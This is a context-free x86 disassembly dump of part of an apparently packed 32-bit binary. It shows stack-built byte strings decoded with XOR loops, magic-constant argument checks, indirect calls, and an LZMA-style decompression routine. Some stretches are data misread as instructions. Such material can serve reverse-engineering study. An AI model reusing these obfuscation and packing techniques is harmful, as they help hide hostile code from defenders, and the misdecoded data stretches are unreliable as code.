  41f9e0:	mov    DWORD PTR ds:0x426e99,edx
  41f9e6:	jmp    0x41f980
  41f9eb:	mov    edx,0x3272fa
  41f9f0:	mov    DWORD PTR ds:0x426ef5,0xc6
  41f9fa:	add    edi,edx
  41f9fc:	add    esi,edx
  41f9fe:	imul   esi,edi
  41fa01:	mov    edi,DWORD PTR [ebp+0xc]
  41fa04:	cmp    edi,esi
  41fa06:	je     0x41fa5b
  41fa0c:	mov    DWORD PTR [ebp-0xc],eax
  41fa0f:	mov    eax,DWORD PTR [ebp-0xc]
  41fa12:	mov    esi,DWORD PTR [ebp+0xc]
  41fa15:	xor    eax,ecx
  41fa17:	lea    eax,[eax*8+0x1939848]
  41fa1e:	mov    eax,DWORD PTR [esi+eax*1]
  41fa21:	mov    DWORD PTR [ebp+0xc],eax
  41fa24:	mov    eax,DWORD PTR [ebp-0x4]
  41fa27:	mov    esi,DWORD PTR [ebp-0x8]
  41fa2a:	xor    eax,ecx
  41fa2c:	xor    esi,ecx
  41fa2e:	add    esi,edx
  41fa30:	add    eax,edx
  41fa32:	imul   eax,esi
  41fa35:	mov    esi,DWORD PTR [ebp+0xc]
  41fa38:	cmp    esi,eax
  41fa3a:	je     0x41fa5b
  41fa40:	mov    eax,DWORD PTR [ebp-0x4]
  41fa43:	xor    eax,ecx
  41fa45:	mov    ecx,DWORD PTR [ebp+0xc]
  41fa48:	add    eax,edx
  41fa4a:	imul   eax,ecx
  41fa4d:	add    eax,DWORD PTR [ebp+0x8]
  41fa50:	mov    DWORD PTR [ebp+0xc],eax
  41fa53:	mov    eax,DWORD PTR [ebp+0xc]
  41fa56:	jmp    0x41fa6c
  41fa5b:	mov    eax,DWORD PTR [ebp-0x4]
  41fa5e:	mov    esi,DWORD PTR [ebp-0x8]
  41fa61:	xor    esi,ecx
  41fa63:	xor    eax,ecx
  41fa65:	add    esi,edx
  41fa67:	add    eax,edx
  41fa69:	imul   eax,esi
  41fa6c:	pop    edi
  41fa6d:	pop    esi
  41fa6e:	leave  
  41fa6f:	ret    0x8
	...
  41fa82:	add    BYTE PTR [eax],al
  41fa84:	pop    ds
  41fa85:	sbb    esi,DWORD PTR [ebp+ecx*2+0x0]
  41fa89:	add    BYTE PTR [eax],al
  41fa8b:	add    BYTE PTR [edx],al
  41fa8d:	add    BYTE PTR [eax],al
  41fa8f:	add    BYTE PTR [ecx+0x0],al
  41fa92:	add    BYTE PTR [eax],al
  41fa94:	mov    al,ds:0xa00001fa
  41fa99:	out    dx,al
  41fa9a:	add    DWORD PTR [eax],eax
  41fa9c:	add    BYTE PTR [eax],al
  41fa9e:	add    BYTE PTR [eax],al
  41faa0:	push   edx
  41faa1:	push   ebx
  41faa2:	inc    esp
  41faa3:	push   ebx
  41faa4:	mov    al,0xd6
  41faa6:	(bad)
  41faa9:	popf   
  41faaa:	hlt    
  41faab:	inc    ecx
  41faac:	mov    DWORD PTR [esi],ebx
  41faae:	aam    0x3c
  41fab0:	xchg   ebx,eax
  41fab1:	popf   
  41fab2:	push   0x1aa
  41fab7:	add    BYTE PTR [ebx+0x3a],al
  41faba:	pop    esp
  41fabb:	inc    esi
  41fabc:	outs   dx,DWORD PTR ds:[esi]
  41fabd:	ins    BYTE PTR es:[edi],dx
  41fabe:	fs gs jb 0x41fae2
  41fac2:	outs   dx,DWORD PTR ds:[esi]
  41fac3:	data16 and BYTE PTR [edi+0x6f],dl
  41fac7:	jb     0x41fb34
  41fac9:	imul   ebp,DWORD PTR [esi+0x67],0x6f725020
  41fad0:	push   0x65
  41fad2:	arpl   WORD PTR [esp+ebx*2+0x50],si
  41fad6:	jb     0x41fb47
  41fad8:	push   0x65
  41fada:	arpl   WORD PTR [esp+edx*2+0x65],si
  41fade:	jae    0x41fb54
  41fae0:	add    BYTE PTR [ebx-0x137e13ab],cl
  41fae6:	or     BYTE PTR [ecx],al
  41fae8:	add    BYTE PTR [eax],al
  41faea:	push   ebx
  41faeb:	mov    eax,ebx
  41faed:	xchg   ecx,eax
  41faee:	mov    eax,DWORD PTR [ebp+0x8]
  41faf1:	cmp    eax,0xf89c85b5
  41faf6:	jne    0x41ff8a
  41fafc:	mov    eax,DWORD PTR [ebp+0xc]
  41faff:	cmp    eax,0xf89c85b4
  41fb04:	jne    0x41ff8a
  41fb0a:	mov    eax,DWORD PTR [ebp+0x24]
  41fb0d:	mov    DWORD PTR [ebp-0x4],eax
  41fb10:	mov    eax,DWORD PTR [ebp-0x4]
  41fb13:	mov    eax,DWORD PTR [eax+0x1d8]
  41fb19:	mov    eax,DWORD PTR [eax]
  41fb1b:	mov    eax,DWORD PTR [eax]
  41fb1d:	mov    DWORD PTR [ebp-0x8],eax
  41fb20:	mov    BYTE PTR [ebp-0x18],0xe0
  41fb24:	mov    BYTE PTR [ebp-0x17],0xdf
  41fb28:	mov    BYTE PTR [ebp-0x16],0xe2
  41fb2c:	mov    BYTE PTR [ebp-0x15],0xac
  41fb30:	mov    BYTE PTR [ebp-0x14],0xad
  41fb34:	mov    BYTE PTR [ebp-0x13],0x7b
  41fb38:	mov    BYTE PTR [ebp-0x20],0xee
  41fb3c:	mov    BYTE PTR [ebp-0x1f],0xec
  41fb40:	mov    BYTE PTR [ebp-0x1e],0xde
  41fb44:	mov    BYTE PTR [ebp-0x1d],0xed
  41fb48:	mov    BYTE PTR [ebp-0x1c],0xac
  41fb4c:	mov    BYTE PTR [ebp-0x1b],0xad
  41fb50:	mov    BYTE PTR [ebp-0x1a],0x7b
  41fb54:	mov    BYTE PTR [ebp-0x28],0xec
  41fb58:	mov    BYTE PTR [ebp-0x27],0xe3
  41fb5c:	mov    BYTE PTR [ebp-0x26],0xe7
  41fb60:	mov    BYTE PTR [ebp-0x25],0xf0
  41fb64:	mov    BYTE PTR [ebp-0x24],0xda
  41fb68:	mov    BYTE PTR [ebp-0x23],0xeb
  41fb6c:	mov    BYTE PTR [ebp-0x22],0xe2
  41fb70:	mov    BYTE PTR [ebp-0x21],0x7b
  41fb74:	xor    ecx,ecx
  41fb76:	lea    eax,[ebp+ecx*1-0x18]
  41fb7a:	movzx  edx,BYTE PTR [eax]
  41fb7d:	xor    edx,0x81
  41fb83:	add    edx,0x6
  41fb86:	inc    ecx
  41fb87:	mov    BYTE PTR [eax],dl
  41fb89:	cmp    ecx,0x6
  41fb8c:	jb     0x41fb76
  41fb8e:	xor    ecx,ecx
  41fb90:	lea    eax,[ebp+ecx*1-0x20]
  41fb94:	movzx  edx,BYTE PTR [eax]
  41fb97:	xor    edx,0x81
  41fb9d:	add    edx,0x6
  41fba0:	inc    ecx
  41fba1:	mov    BYTE PTR [eax],dl
  41fba3:	cmp    ecx,0x7
  41fba6:	jb     0x41fb90
  41fba8:	xor    ecx,ecx
  41fbaa:	lea    eax,[ebp+ecx*1-0x28]
  41fbae:	movzx  edx,BYTE PTR [eax]
  41fbb1:	xor    edx,0x81
  41fbb7:	add    edx,0x6
  41fbba:	inc    ecx
  41fbbb:	mov    BYTE PTR [eax],dl
  41fbbd:	cmp    ecx,0x8
  41fbc0:	jb     0x41fbaa
  41fbc2:	lea    eax,[ebp-0x2c]
  41fbc5:	mov    DWORD PTR [ebp-0x8],eax
  41fbc8:	mov    ecx,DWORD PTR [ebp-0x8]
  41fbcb:	mov    eax,0x7113fcef
  41fbd0:	push   esi
  41fbd1:	mov    DWORD PTR [ecx],eax
  41fbd3:	mov    ecx,DWORD PTR [ebp-0x2c]
  41fbd6:	mov    esi,0x4e3c
  41fbdb:	push   edi
  41fbdc:	lea    edi,[esi-0x2]
  41fbdf:	mov    ebx,0x3272fa
  41fbe4:	cmp    ecx,eax
  41fbe6:	jne    0x41fcb7
  41fbec:	lea    eax,[esi+0x3b]
  41fbef:	mov    WORD PTR [ebp-0x78],ax
  41fbf3:	mov    eax,esi
  41fbf5:	mov    WORD PTR [ebp-0x76],ax
  41fbf9:	add    eax,0x3d
  41fbfc:	mov    WORD PTR [ebp-0x74],ax
  41fc00:	lea    eax,[esi+0x2]
  41fc03:	mov    WORD PTR [ebp-0x72],ax
  41fc07:	add    eax,0x41
  41fc0a:	mov    WORD PTR [ebp-0x70],ax
  41fc0e:	mov    eax,edi
  41fc10:	mov    WORD PTR [ebp-0x6e],ax
  41fc14:	mov    eax,0x4f90
  41fc19:	mov    WORD PTR [ebp-0x6c],ax
  41fc1d:	lea    eax,[esi-0x7]
  41fc20:	mov    WORD PTR [ebp-0x6a],ax
  41fc24:	add    eax,0x30
  41fc27:	mov    WORD PTR [ebp-0x68],ax
  41fc2b:	lea    eax,[esi-0xb]
  41fc2e:	mov    WORD PTR [ebp-0x66],ax
  41fc32:	mov    eax,esi
  41fc34:	mov    WORD PTR [ebp-0x64],ax
  41fc38:	add    eax,0xfffffff4
  41fc3b:	mov    WORD PTR [ebp-0x62],ax
  41fc3f:	mov    eax,0x44b
  41fc44:	mov    WORD PTR [ebp-0x60],ax
  41fc48:	mov    eax,0x567a
  41fc4d:	mov    WORD PTR [ebp-0x5e],ax
  41fc51:	mov    eax,0x611a
  41fc56:	mov    WORD PTR [ebp-0x5c],ax
  41fc5a:	mov    eax,0xf1e4
  41fc5f:	mov    WORD PTR [ebp-0x5a],ax
  41fc63:	mov    eax,edi
  41fc65:	mov    WORD PTR [ebp-0x58],ax
  41fc69:	lea    eax,[ebp-0xe0]
  41fc6f:	push   eax
  41fc70:	mov    eax,DWORD PTR [ebp+0xc]
  41fc73:	xor    eax,0x75108b3
  41fc78:	add    eax,ebx
  41fc7a:	push   eax
  41fc7b:	lea    eax,[ebp-0x78]
  41fc7e:	push   eax
  41fc7f:	mov    eax,DWORD PTR [ebp-0x4]
  41fc82:	mov    eax,DWORD PTR [eax+0x198]
  41fc88:	mov    DWORD PTR [ebp-0xe0],0x1
  41fc92:	mov    DWORD PTR [ebp-0xdc],0xffff
  41fc9c:	push   DWORD PTR [eax]
  41fc9e:	mov    eax,DWORD PTR [ebp+0x10]
  41fca1:	call   eax
  41fca3:	mov    DWORD PTR [ebp-0x8],eax
  41fca6:	mov    eax,DWORD PTR [ebp-0x8]
  41fca9:	test   eax,eax
  41fcab:	je     0x41fcb7
  41fcad:	xor    DWORD PTR ds:0xe041cd9,0x9f170bc8
  41fcb7:	mov    eax,DWORD PTR [ebp-0x4]
  41fcba:	mov    ecx,DWORD PTR [eax+0x18c]
  41fcc0:	xor    eax,eax
  41fcc2:	cmp    DWORD PTR [ecx],eax
  41fcc4:	jne    0x41fefa
  41fcca:	mov    ecx,DWORD PTR [ebp-0x4]
  41fccd:	mov    ecx,DWORD PTR [ecx+0x17c]
  41fcd3:	mov    DWORD PTR [ecx],eax
  41fcd5:	mov    ecx,DWORD PTR [ebp-0x4]
  41fcd8:	mov    ecx,DWORD PTR [ecx+0x180]
  41fcde:	mov    DWORD PTR [ecx],eax
  41fce0:	mov    eax,0x4e69
  41fce5:	mov    WORD PTR [ebp-0x9c],ax
  41fcec:	mov    eax,esi
  41fcee:	mov    WORD PTR [ebp-0x9a],ax
  41fcf5:	mov    eax,0x4e79
  41fcfa:	mov    WORD PTR [ebp-0x98],ax
  41fd01:	add    eax,0xffffffc0
  41fd04:	mov    WORD PTR [ebp-0x96],ax
  41fd0b:	mov    eax,0x4f8c
  41fd10:	mov    WORD PTR [ebp-0x94],ax
  41fd17:	mov    eax,0x4e38
  41fd1c:	mov    WORD PTR [ebp-0x92],ax
  41fd23:	mov    eax,esi
  41fd25:	mov    WORD PTR [ebp-0x8c],ax
  41fd2c:	mov    eax,0x4e35
  41fd31:	mov    WORD PTR [ebp-0x8a],ax
  41fd38:	mov    eax,0x99f9
  41fd3d:	mov    WORD PTR [ebp-0x88],ax
  41fd44:	mov    eax,0x8d68
  41fd49:	mov    WORD PTR [ebp-0x86],ax
  41fd50:	mov    eax,0xd66f
  41fd55:	mov    WORD PTR [ebp-0x84],ax
  41fd5c:	mov    BYTE PTR [ebp-0x10],0xec
  41fd60:	mov    eax,0xd78b
  41fd65:	mov    WORD PTR [ebp-0x82],ax
  41fd6c:	mov    BYTE PTR [ebp-0xf],0xe3
  41fd70:	mov    eax,0x278a
  41fd75:	mov    BYTE PTR [ebp-0xe],0xe7
  41fd79:	mov    WORD PTR [ebp-0x80],ax
  41fd7d:	mov    BYTE PTR [ebp-0xd],0xf0
  41fd81:	mov    eax,0x478a
  41fd86:	mov    BYTE PTR [ebp-0xc],0xda
  41fd8a:	mov    WORD PTR [ebp-0x7e],ax
  41fd8e:	mov    eax,0x4e3b
  41fd93:	mov    BYTE PTR [ebp-0xb],0xeb
  41fd97:	push   0x8
  41fd99:	mov    BYTE PTR [ebp-0xa],0xe2
  41fd9d:	mov    WORD PTR [ebp-0x7c],ax
  41fda1:	mov    BYTE PTR [ebp-0x9],0x7b
  41fda5:	mov    DWORD PTR [ebp-0x90],0x4e3a4e65
  41fdaf:	lea    eax,[ebp-0x10]
  41fdb2:	pop    edi
  41fdb3:	movzx  ecx,BYTE PTR [eax]
  41fdb6:	xor    ecx,0x81
  41fdbc:	add    ecx,0x6
  41fdbf:	mov    BYTE PTR [eax],cl
  41fdc1:	inc    eax
  41fdc2:	dec    edi
  41fdc3:	jne    0x41fdb3
  41fdc5:	mov    DWORD PTR [ebp-0xe0],0x1
  41fdcf:	lea    eax,[ebp-0x10]
  41fdd2:	mov    DWORD PTR [ebp-0xdc],eax
  41fdd8:	mov    ecx,0x4e64
  41fddd:	mov    eax,ecx
  41fddf:	mov    WORD PTR [ebp-0x40],ax
  41fde3:	add    eax,0xf
  41fde6:	mov    edx,eax
  41fde8:	mov    WORD PTR [ebp-0x3e],dx
  41fdec:	mov    edx,0x4f9b
  41fdf1:	mov    WORD PTR [ebp-0x3c],dx
  41fdf5:	add    edx,0xfffffff8
  41fdf8:	mov    WORD PTR [ebp-0x3a],dx
  41fdfc:	mov    edx,0x4f8d
  41fe01:	mov    WORD PTR [ebp-0x38],dx
  41fe05:	inc    edx
  41fe06:	mov    WORD PTR [ebp-0x36],dx
  41fe0a:	mov    edx,0x4f87
  41fe0f:	mov    WORD PTR [ebp-0x34],dx
  41fe13:	mov    WORD PTR [ebp-0x32],cx
  41fe17:	mov    ecx,esi
  41fe19:	mov    WORD PTR [ebp-0x30],cx
  41fe1d:	lea    ecx,[edx-0x3]
  41fe20:	mov    edx,ecx
  41fe22:	mov    WORD PTR [ebp-0x54],dx
  41fe26:	mov    edx,eax
  41fe28:	mov    WORD PTR [ebp-0x52],dx
  41fe2c:	mov    edx,0x4e7b
  41fe31:	mov    WORD PTR [ebp-0x50],dx
  41fe35:	mov    WORD PTR [ebp-0x4e],ax
  41fe39:	lea    eax,[edx-0xe]
  41fe3c:	mov    WORD PTR [ebp-0x4c],ax
  41fe40:	inc    eax
  41fe41:	mov    WORD PTR [ebp-0x4a],ax
  41fe45:	lea    eax,[edx-0x14]
  41fe48:	mov    WORD PTR [ebp-0x48],ax
  41fe4c:	mov    WORD PTR [ebp-0x46],cx
  41fe50:	mov    WORD PTR [ebp-0x44],si
  41fe54:	mov    ecx,DWORD PTR [ebp+0x8]
  41fe57:	movzx  edx,WORD PTR [ebp-0x54]
  41fe5b:	mov    eax,0x75108b3
  41fe60:	xor    ecx,eax
  41fe62:	add    ecx,ebx
  41fe64:	xor    ecx,edx
  41fe66:	mov    WORD PTR [ebp-0x54],cx
  41fe6a:	mov    ecx,DWORD PTR [ebp+0x8]
  41fe6d:	xor    ecx,eax
  41fe6f:	movzx  eax,WORD PTR [ebp-0x40]
  41fe73:	add    ecx,ebx
  41fe75:	xor    ecx,eax
  41fe77:	xor    eax,eax
  41fe79:	mov    WORD PTR [ebp-0x40],cx
  41fe7d:	mov    WORD PTR [ebp-0xf4],ax
  41fe84:	mov    WORD PTR [ebp-0x108],ax
  41fe8b:	mov    edi,DWORD PTR [ebp+0x24]
  41fe8e:	lea    eax,[ebp-0xf4]
  41fe94:	lea    edx,[ebp-0x54]
  41fe97:	mov    DWORD PTR [ebp-0xe0],0x2
  41fea1:	mov    DWORD PTR [ebp-0xdc],eax
  41fea7:	call   0x4228e9
  41feac:	mov    ecx,DWORD PTR [ebp+0x8]
  41feaf:	mov    DWORD PTR [ebp-0xd8],eax
  41feb5:	mov    eax,0x75108b3
  41feba:	xor    ecx,eax
  41febc:	add    ecx,ebx
  41febe:	je     0x41fedd
  41fec0:	lea    ecx,[ebp-0xe0]
  41fec6:	push   ecx
  41fec7:	mov    ecx,DWORD PTR [ebp+0xc]
  41feca:	xor    ecx,eax
  41fecc:	add    ecx,ebx
  41fece:	push   ecx
  41fecf:	lea    eax,[ebp-0x9c]
  41fed5:	push   eax
  41fed6:	mov    eax,DWORD PTR [ebp+0x10]
  41fed9:	push   0x0
  41fedb:	call   eax
  41fedd:	mov    edi,DWORD PTR [ebp+0x24]
  41fee0:	lea    eax,[ebp-0x108]
  41fee6:	lea    edx,[ebp-0x40]
  41fee9:	mov    DWORD PTR [ebp-0xdc],eax
  41feef:	call   0x4228e9
  41fef4:	mov    DWORD PTR [ebp-0xd8],eax
  41fefa:	mov    eax,DWORD PTR [ebp+0x14]
  41fefd:	push   DWORD PTR [ebp-0x4]
  41ff00:	push   DWORD PTR [ebp+0x20]
  41ff03:	push   DWORD PTR [ebp+0x1c]
  41ff06:	push   DWORD PTR [ebp+0x18]
  41ff09:	push   DWORD PTR [ebp+0x10]
  41ff0c:	push   DWORD PTR [ebp+0x8]
  41ff0f:	push   DWORD PTR [ebp+0xc]
  41ff12:	call   0x42118a
  41ff17:	test   eax,eax
  41ff19:	je     0x41ff60
  41ff1b:	add    DWORD PTR [ebp-0x4],eax
  41ff1e:	push   DWORD PTR [ebp-0x4]
  41ff21:	lea    esi,[ebp+0x4]
  41ff24:	call   0x420378
  41ff29:	mov    eax,DWORD PTR [ebp-0x4]
  41ff2c:	mov    eax,DWORD PTR [eax+0x1c8]
  41ff32:	mov    eax,DWORD PTR [eax]
  41ff34:	xor    eax,0x75108b3
  41ff39:	add    eax,ebx
  41ff3b:	mov    eax,DWORD PTR [ebp-0x4]
  41ff3e:	jne    0x41ff56
  41ff40:	mov    ecx,DWORD PTR [ebp-0x4]
  41ff43:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41ff49:	push   DWORD PTR [ecx]
  41ff4b:	mov    eax,DWORD PTR [eax+0x1e0]
  41ff51:	call   DWORD PTR [eax+0x28]
  41ff54:	jmp    0x41ff60
  41ff56:	mov    eax,DWORD PTR [eax+0x17c]
  41ff5c:	mov    eax,DWORD PTR [eax]
  41ff5e:	add    DWORD PTR [esi],eax
  41ff60:	mov    eax,DWORD PTR [ebp-0x4]
  41ff63:	mov    eax,DWORD PTR [eax+0x1dc]
  41ff69:	dec    DWORD PTR [eax]
  41ff6b:	mov    ecx,DWORD PTR [ebp-0x4]
  41ff6e:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41ff74:	mov    eax,DWORD PTR [eax]
  41ff76:	lea    eax,[ecx+eax*4]
  41ff79:	mov    ecx,DWORD PTR [ebp-0x4]
  41ff7c:	mov    ecx,DWORD PTR [ecx+0x17c]
  41ff82:	mov    eax,DWORD PTR [eax]
  41ff84:	mov    ecx,DWORD PTR [ecx]
  41ff86:	add    DWORD PTR [eax],ecx
  41ff88:	pop    edi
  41ff89:	pop    esi
  41ff8a:	pop    ebx
  41ff8b:	leave  
  41ff8c:	ret    0x20
  41ff8f:	push   edi
  41ff90:	push   esi
  41ff91:	push   ebx
  41ff92:	push   ebp
  41ff93:	mov    ebp,esp
  41ff95:	mov    eax,DWORD PTR [ebp+0x24]
  41ff98:	add    DWORD PTR [ebp+0x28],eax
  41ff9b:	push   eax
  41ff9c:	cld    
  41ff9d:	mov    esi,DWORD PTR [ebp+0x18]
  41ffa0:	add    DWORD PTR [ebp+0x1c],esi
  41ffa3:	push   esi
  41ffa4:	mov    esi,DWORD PTR [ebp+0x14]
  41ffa7:	lods   eax,DWORD PTR ds:[esi]
  41ffa8:	xchg   edx,eax
  41ffa9:	push   edx
  41ffaa:	mov    cl,BYTE PTR [esi-0x2]
  41ffad:	or     eax,0xffffffff
  41ffb0:	shl    eax,cl
  41ffb2:	not    eax
  41ffb4:	push   eax
  41ffb5:	mov    cl,dh
  41ffb7:	or     eax,0xffffffff
  41ffba:	shl    eax,cl
  41ffbc:	not    eax
  41ffbe:	push   eax
  41ffbf:	add    cl,dl
  41ffc1:	mov    edi,esi
  41ffc3:	sub    esp,0xc
  41ffc6:	sub    eax,eax
  41ffc8:	inc    eax
  41ffc9:	push   eax
  41ffca:	push   eax
  41ffcb:	push   eax
  41ffcc:	push   eax
  41ffcd:	push   eax
  41ffce:	push   edi
  41ffcf:	sub    esi,esi
  41ffd1:	push   esi
  41ffd2:	or     ebx,0xffffffff
  41ffd5:	mov    eax,0x300
  41ffda:	shl    eax,cl
  41ffdc:	lea    ecx,[eax+0x736]
  41ffe2:	mov    eax,0x4000400
  41ffe7:	shr    ecx,1
  41ffe9:	rep stos DWORD PTR es:[edi],eax
  41ffeb:	push   0x5
  41ffed:	pop    ecx
  41ffee:	call   0x4202d9
  41fff3:	loop   0x41ffee
  41fff5:	lea    esi,[esi]
  41fff7:	lea    edi,[edi]
  41fff9:	mov    edi,DWORD PTR [ebp-0x4]
  41fffc:	mov    eax,DWORD PTR [ebp-0x10]
  41ffff:	sub    edi,DWORD PTR [ebp+0x24]
  420002:	and    eax,edi
  420004:	mov    DWORD PTR [ebp-0x18],eax
  420007:	mov    al,0x0
  420009:	call   0x4202f1
  42000e:	jne    0x4200a9
  420014:	mov    cl,BYTE PTR [ebp-0xc]
  420017:	and    edi,DWORD PTR [ebp-0x14]
  42001a:	shl    edi,cl
  42001c:	sub    cl,0x8
  42001f:	neg    cl
  420021:	shr    esi,cl
  420023:	pop    eax
  420024:	add    edi,esi
  420026:	pop    esi
  420027:	lea    edi,[edi+edi*2]
  42002a:	shl    edi,0x8
  42002d:	cmp    al,0x7
  42002f:	pop    edx
  420030:	lea    ecx,[esi+edi*2+0xe6c]
  420037:	push   ecx
  420038:	push   esi
  420039:	mov    esi,0x100
  42003e:	push   eax
  42003f:	mov    al,0x1
  420041:	jb     0x420077
  420043:	mov    edi,DWORD PTR [ebp-0x4]
  420046:	sub    edi,DWORD PTR [ebp-0x24]
  420049:	movzx  edi,BYTE PTR [edi]
  42004c:	mov    ebp,DWORD PTR [ebp-0x34]
  42004f:	shl    edi,1
  420051:	mov    ecx,esi
  420053:	and    esi,edi
  420055:	add    ecx,esi
  420057:	lea    ebp,[ebp+ecx*2+0x0]
  42005b:	call   0x420310
  420060:	mov    ecx,eax
  420062:	shr    esi,0x8
  420065:	and    ecx,0x1
  420068:	cmp    esi,ecx
  42006a:	mov    esi,0x100
  42006f:	jne    0x42007f
  420071:	cmp    eax,esi
  420073:	jb     0x42004c
  420075:	jmp    0x42008b
  420077:	mov    ebp,DWORD PTR [ebp-0x34]
  42007a:	call   0x420310
  42007f:	inc    eax
  420080:	inc    esi
  420081:	sub    eax,0x1
  420084:	sub    esi,0x1
  420087:	cmp    eax,esi
  420089:	jb     0x420077
  42008b:	pop    edx
  42008c:	inc    edx
  42008d:	cmp    edx,0x5
  420090:	dec    edx
  420091:	mov    ecx,edx
  420093:	jb     0x4200a4
  420095:	inc    edx
  420096:	cmp    edx,0xb
  420099:	dec    edx
  42009a:	mov    cl,0x4
  42009c:	dec    cl
  42009e:	jb     0x4200a4
  4200a0:	mov    cl,0x7
  4200a2:	dec    cl
  4200a4:	sub    edx,ecx
  4200a6:	push   edx
  4200a7:	jmp    0x4200f8
  4200a9:	mov    al,0xc1
  4200ab:	dec    al
  4200ad:	call   0x420301
  4200b2:	jne    0x4200c8
  4200b4:	pop    eax
  4200b5:	pop    edi
  4200b6:	pop    edx
  4200b7:	pop    ecx
  4200b8:	pop    edx
  4200b9:	pop    ecx
  4200ba:	push   DWORD PTR [esp]
  4200bd:	push   ecx
  4200be:	push   edx
  4200bf:	mov    edx,0x664
  4200c4:	mov    cl,0x0
  4200c6:	jmp    0x42013b
  4200c8:	mov    al,0xcd
  4200ca:	dec    al
  4200cc:	call   0x420301
  4200d1:	jne    0x420101
  4200d3:	mov    al,0xf1
  4200d5:	dec    al
  4200d7:	call   0x4202f1
  4200dc:	jne    0x420131
  4200de:	pop    eax
  4200df:	cmp    al,0x7
  4200e1:	mov    al,0x9
  4200e3:	jb     0x4200e7
  4200e5:	mov    al,0xb
  4200e7:	push   eax
  4200e8:	mov    esi,DWORD PTR [ebp-0x4]
  4200eb:	sub    esi,DWORD PTR [ebp-0x24]
  4200ee:	cmp    esi,DWORD PTR [ebp+0x24]
  4200f1:	jb     0x4202c8
  4200f7:	lods   al,BYTE PTR ds:[esi]
  4200f8:	mov    edi,DWORD PTR [ebp-0x4]
  4200fb:	stos   BYTE PTR es:[edi],al
  4200fc:	jmp    0x42028f
  420101:	mov    al,0xd8
  420103:	call   0x420301
  420108:	mov    esi,DWORD PTR [ebp-0x28]
  42010b:	je     0x420128
  42010d:	mov    al,0xe4
  42010f:	call   0x420301
  420114:	mov    esi,DWORD PTR [ebp-0x2c]
  420117:	je     0x420122
  420119:	mov    esi,DWORD PTR [ebp-0x30]
  42011c:	mov    ecx,DWORD PTR [ebp-0x2c]
  42011f:	mov    DWORD PTR [ebp-0x30],ecx
  420122:	mov    ecx,DWORD PTR [ebp-0x28]
  420125:	mov    DWORD PTR [ebp-0x2c],ecx
  420128:	mov    ecx,DWORD PTR [ebp-0x24]
  42012b:	mov    DWORD PTR [ebp-0x28],ecx
  42012e:	mov    DWORD PTR [ebp-0x24],esi
  420131:	pop    eax
  420132:	pop    edi
  420133:	pop    ecx
  420134:	mov    edx,0xa68
  420139:	mov    cl,0x8
  42013b:	add    edx,edi
  42013d:	push   edx
  42013e:	push   edi
  42013f:	cmp    al,0x7
  420141:	mov    al,cl
  420143:	jb     0x420147
  420145:	add    al,0x3
  420147:	push   eax
  420148:	mov    ebp,DWORD PTR [ebp-0x34]
  42014b:	call   0x42030e
  420150:	jne    0x420166
  420152:	mov    eax,DWORD PTR [ebp-0x18]
  420155:	mov    edi,DWORD PTR [ebp-0x34]
  420158:	shl    eax,0x3
  42015b:	sub    ecx,ecx
  42015d:	push   0x8
  42015f:	pop    esi
  420160:	lea    edi,[edi+eax*2+0x4]
  420164:	jmp    0x42019b
  420166:	mov    ebp,DWORD PTR [ebp-0x34]
  420169:	add    ebp,0x2
  42016c:	call   0x42030e
  420171:	jne    0x42018b
  420173:	mov    eax,DWORD PTR [ebp-0x18]
  420176:	mov    edi,DWORD PTR [ebp-0x34]
  420179:	shl    eax,0x3
  42017c:	push   0x8
  42017e:	pop    ecx
  42017f:	push   0x8
  420181:	pop    esi
  420182:	lea    edi,[edi+eax*2+0x104]
  420189:	jmp    0x42019b
  42018b:	mov    edi,0x204
  420190:	add    edi,DWORD PTR [ebp-0x34]
  420193:	push   0x10
  420195:	pop    ecx
  420196:	mov    esi,0x100
  42019b:	mov    DWORD PTR [ebp-0x1c],ecx
  42019e:	sub    eax,eax
  4201a0:	inc    eax
  4201a1:	mov    ebp,edi
  4201a3:	call   0x420310
  4201a8:	mov    ecx,eax
  4201aa:	sub    ecx,esi
  4201ac:	jb     0x4201a1
  4201ae:	add    DWORD PTR [ebp-0x1c],ecx
  4201b1:	cmp    DWORD PTR [ebp-0x3c],0x4
  4201b5:	jae    0x42026b
  4201bb:	add    DWORD PTR [ebp-0x3c],0x7
  4201bf:	mov    ecx,DWORD PTR [ebp-0x1c]
  4201c2:	cmp    ecx,0x4
  4201c5:	jb     0x4201ca
  4201c7:	push   0x3
  4201c9:	pop    ecx
  4201ca:	mov    edi,DWORD PTR [ebp-0x38]
  4201cd:	shl    ecx,0x6
  4201d0:	sub    eax,eax
  4201d2:	inc    eax
  4201d3:	push   0x40
  4201d5:	pop    esi
  4201d6:	lea    edi,[edi+ecx*2+0x360]
  4201dd:	mov    ebp,edi
  4201df:	call   0x420310
  4201e4:	mov    ecx,eax
  4201e6:	sub    ecx,esi
  4201e8:	jb     0x4201dd
  4201ea:	mov    DWORD PTR [ebp-0x18],ecx
  4201ed:	mov    DWORD PTR [ebp-0x24],ecx
  4201f0:	cmp    ecx,0x4
  4201f3:	jb     0x420268
  4201f5:	mov    esi,ecx
  4201f7:	and    DWORD PTR [ebp-0x24],0x1
  4201fb:	shr    esi,1
  4201fd:	or     DWORD PTR [ebp-0x24],0x2
  420201:	dec    esi
  420202:	cmp    ecx,0xe
  420205:	jae    0x420220
  420207:	mov    eax,0x2af
  42020c:	sub    eax,ecx
  42020e:	mov    ecx,esi
  420210:	shl    BYTE PTR [ebp-0x24],cl
  420213:	add    eax,DWORD PTR [ebp-0x24]
  420216:	shl    eax,1
  420218:	add    eax,DWORD PTR [ebp-0x38]
  42021b:	mov    DWORD PTR [ebp-0x34],eax
  42021e:	jmp    0x42024d
  420220:	sub    esi,0x4
  420223:	call   0x4202cd
  420228:	shr    ebx,1
  42022a:	shl    DWORD PTR [ebp-0x24],1
  42022d:	cmp    DWORD PTR [ebp-0x20],ebx
  420230:	jb     0x420238
  420232:	inc    DWORD PTR [ebp-0x24]
  420235:	sub    DWORD PTR [ebp-0x20],ebx
  420238:	dec    esi
  420239:	jne    0x420223
  42023b:	mov    eax,0x644
  420240:	add    eax,DWORD PTR [ebp-0x38]
  420243:	mov    DWORD PTR [ebp-0x34],eax
  420246:	shl    DWORD PTR [ebp-0x24],0x4
  42024a:	push   0x4
  42024c:	pop    esi
  42024d:	sub    edi,edi
  42024f:	inc    edi
  420250:	mov    eax,edi
  420252:	mov    ebp,DWORD PTR [ebp-0x34]
  420255:	call   0x420310
  42025a:	test   al,0x1
  42025c:	je     0x420261
  42025e:	or     DWORD PTR [ebp-0x24],edi
  420261:	shl    edi,1
  420263:	dec    esi
